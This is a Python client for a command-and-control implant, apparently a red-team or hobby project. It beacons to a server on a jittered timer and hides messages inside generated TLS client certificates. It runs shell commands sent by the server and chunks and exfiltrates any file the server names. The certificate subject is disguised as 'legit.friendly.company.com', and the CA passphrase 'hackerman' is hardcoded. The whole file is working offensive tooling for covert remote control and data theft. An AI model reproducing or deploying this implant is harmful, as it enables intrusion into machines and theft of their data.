import subprocess
import time
from os import path
import socket
import ssl
import random
import cryptography
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cert_gen import gen_msg_cert, get_cert_msg


def run_bash_cmd(cmd):
    """ Run the cmd sent by the server and return the output """
    process = subprocess.run(
        cmd,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        check=True, text=True)
    data = process.stdout.strip()
    return data


def chunk_file(exfil_file, max_block_size, jitter):
    """
    Chunk the file during data exfiltration

    transfer_state
        - 1=first blob
        - 2=not first, not last
        - 3=last blob
    """
    position = 0
    transfer_state = 1
    with open(exfil_file, "rb") as handle:
        while True:
            rnd_jitter = random.randrange(0, jitter) / 100
            size = int(max_block_size - (max_block_size * rnd_jitter))
            image_data = handle.read(size)
            if not image_data:
                break
            print(f"reading {len(image_data)} bytes from file")
            position += size
            if transfer_state == 2 and len(image_data) != size:
                transfer_state = 3
            yield image_data, transfer_state
            if transfer_state == 1:
                transfer_state = 2


def call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, msg_cert):
    msg_cert, msg_key = msg_cert
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setblocking(1)
        sock.settimeout(10)
        try:
            sock.connect((host_addr, host_port))
        except ConnectionRefusedError as ex:
            """ Note: after each msg from the server, the server has to generate a new cert for the next msg, 
            tear down the socket, and spin up a new socket with the new cert. If the client tries to call 
            while the socket is down, just sleep a bit and try again
            """
            print(f"Server connection refused - trying again soon")
            return None
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.load_verify_locations(cafile=ca_cert_path)
        context.load_cert_chain(certfile=msg_cert, keyfile=msg_key)
        with context.wrap_socket(sock, server_side=False, server_hostname=server_sni_hostname) as secure_sock:
            cert = secure_sock.getpeercert(binary_form=True)
            cert = x509.load_der_x509_certificate(cert)
            # secure_sock.write(b'hello')
            # print(secure_sock.read(1024))
    return cert


def send_file(host_addr, host_port, cert_root_path, ca_cert_path, ca_cert, ca_key, server_sni_hostname,
              subject, exfil_file, max_block_size, data_jitter):
    """
    msg format: is_first|is_last|len_of_data_chuck|file_name
    change to:
    msg format: transfer_state|len_of_data_chuck|file_name
        transfer_state: 1=is_first, 2=is_middle, 3=is_last
    """
    gen_cert_path = f"{cert_root_path}/client_certs"
    file_name = path.basename(exfil_file)
    # break data file into chunks to send
    for data_chunck, transfer_state in chunk_file(exfil_file, max_block_size, data_jitter):
        # generate the client cert with embedded data
        msg = f"{transfer_state}|{len(data_chunck)}|{file_name}"
        msg_cert_path, msg_key_path = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data_chunck)
        # send data to server
        call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, (msg_cert_path, msg_key_path))
    print("file exfill complete")


def pos_or_neg():
    if random.random() > 0.5:
        return 1
    return -1


def start_client(host_addr, host_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject,
                 server_sni_hostname, beacon_interval, beacon_jitter, max_block_size, data_jitter):
    gen_cert_path = f"{cert_root_path}/client_certs"
    with open(ca_cert_path, 'rb') as handle:
        ca_cert_bytes = handle.read()
        ca_cert = cryptography.x509.load_pem_x509_certificate(ca_cert_bytes, backend=default_backend)
    with open(ca_key_path, 'rb') as handle:
        ca_key = cryptography.hazmat.primitives.serialization.load_pem_private_key(handle.read(), password=passphrase)

    # pre-create the request command
    request_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="request")
    next_msg_cert = request_msg_cert
    while True:
        # calc beacon delay
        beacon_delay = int(beacon_interval + (pos_or_neg() * (beacon_interval * (random.randrange(0, beacon_jitter) / 100))))
        print(f"sleeping for {beacon_delay} seconds")
        time.sleep(beacon_delay)
        # call server for cmd
        cert = call_server(host_addr, host_port, server_sni_hostname, ca_cert_path, next_msg_cert)
        if cert:
            srv_msg, srv_data = get_cert_msg(cert)
            if srv_msg == "bash":
                command = srv_data.strip()
                print(f"executing cmd: {command}")
                data = run_bash_cmd(command.split(" "))
                msg = f"response"
                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=msg, data=data)
            elif srv_msg == "noop":
                # nothing to do
                print("noop")
                next_msg_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg="response")
            elif srv_msg == "wait":
                # update beacon interval
                beacon_interval, beacon_jitter = srv_data.strip().split(",")
                beacon_interval = int(beacon_interval)
                beacon_jitter = int(beacon_jitter)
                print(f"updating beacon interval to {beacon_interval} with jitter of {beacon_jitter}")
                next_msg_cert = request_msg_cert
            elif srv_msg == "exfil":
                exfil_file = srv_data.strip()
                send_file(host_addr, host_port, cert_root_path, ca_cert_path,
                          ca_cert, ca_key, server_sni_hostname,
                          subject, exfil_file, max_block_size, data_jitter)
                # set next msg to request
                next_msg_cert = request_msg_cert
            elif srv_msg == "kill":
                print("SHUTTING DOWN")
                return
            else:
                print(f"WARN: invalid msg: {srv_msg}")


def main():
    host_addr = "127.0.0.1"
    host_port = 8089
    # at some point create a channel to pull the ca pem/key from the server at runtime so its not hard coded
    passphrase = b"hackerman"
    cert_root_path = "certs/"
    ca_cert = f"{cert_root_path}/ca_certs/hmCA.pem"
    ca_key = f"{cert_root_path}/ca_certs/hmCA.key"
    server_sni_hostname = "org.gov.hackerman.xyz"
    subject = {
        "C": "US",
        "ST": "Washington",
        "L": "Seattle",
        "O": "Friendly Company LLC",
        "CN": "legit.friendly.company.com",
    }
    beacon_interval = 5
    beacon_jitter = 30
    max_block_size = 50000  # max block size is ~60000
    data_jitter = 30  # jitter from 0 to 100
    start_client(
        host_addr,
        host_port,
        cert_root_path,
        ca_cert,
        ca_key,
        passphrase,
        subject,
        server_sni_hostname,
        beacon_interval,
        beacon_jitter,
        max_block_size,
        data_jitter)


if __name__ == '__main__':
    main()
